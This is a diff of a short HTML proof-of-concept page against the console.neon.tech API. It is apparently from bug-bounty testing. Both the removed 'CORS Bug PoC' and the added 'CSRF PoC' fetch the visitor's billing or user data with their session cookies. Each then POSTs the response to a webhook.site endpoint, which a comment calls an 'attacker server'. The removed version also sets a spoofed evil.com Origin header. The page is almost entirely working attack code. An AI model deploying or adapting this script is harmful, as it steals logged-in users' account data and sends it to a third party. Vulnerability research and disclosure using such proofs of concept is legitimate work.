@@ -1,46 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS Bug Test</title>
-</head>
+<html>
 <body>
-  <h1>CORS Bug PoC</h1>
-  <pre id="output">Waiting for data...</pre>
-
-  <script>
-    async function fetchData() {
-      const output = document.getElementById("output");
-
-      try {
-        // Target URL where you found the CORS issue
-        const targetUrl = "https://console.neon.tech/api/v2/organizations/org-round-lab-67110498/billing/account";
-
-        const response = await fetch(targetUrl, {
-          method: "GET",
-          credentials: "include", // sends cookies/session
-          headers: {
-            "Origin": "https://evil.com",       // simulate attacker's origin
-            "X-Csrf-Token": "randomstring"     // bypass if CSRF isn't validated
-          }
-        });
-
-        const data = await response.json();
-        output.textContent = JSON.stringify(data, null, 2);
-
-        // Send captured data to your webhook
-        await fetch("https://webhook.site/YOUR-UNIQUE-ID", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-
-      } catch (err) {
-        output.textContent = "Error: " + err;
-      }
-    }
-
-    fetchData();
-  </script>
+<h3>CSRF PoC - Neon User Data</h3>
+<script>
+  // Try to fetch user data with cookies
+  fetch("https://console.neon.tech/api/v2/users/me", {
+    credentials: "include"
+  })
+  .then(r => r.text())
+  .then(d => {
+    // Attempt exfiltration to attacker server
+    fetch("https://webhook.site/31610c4c-f3be-4956-8fe1-d51b5bfd470e", {
+      method: "POST",
+      body: d,
+      mode: "no-cors"
+    });
+    document.body.innerHTML += "<pre>" + d + "</pre>";
+  })
+  .catch(e => document.body.innerHTML += "Blocked: " + e);
+</script>
 </body>
 </html>
